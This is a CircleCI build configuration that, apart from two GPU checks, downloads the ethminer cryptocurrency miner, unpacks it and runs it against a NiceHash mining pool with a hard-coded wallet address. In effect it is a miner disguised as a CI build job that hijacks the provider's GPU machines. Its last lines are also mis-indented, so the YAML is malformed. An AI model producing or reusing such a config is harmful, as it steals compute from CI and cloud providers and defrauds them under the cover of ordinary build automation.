version: 2.1

jobs:
  build:
    machine:
      image: ubuntu-2004-cuda-11.4:202110-01
    resource_class: gpu.nvidia.large
    steps:
      - run: nvidia-smi
      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
      - run: wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz

tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz

cd bin

./ethminer -G -P stratum://3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5.Grafith:x@daggerhashimoto.usa.nicehash.com:3353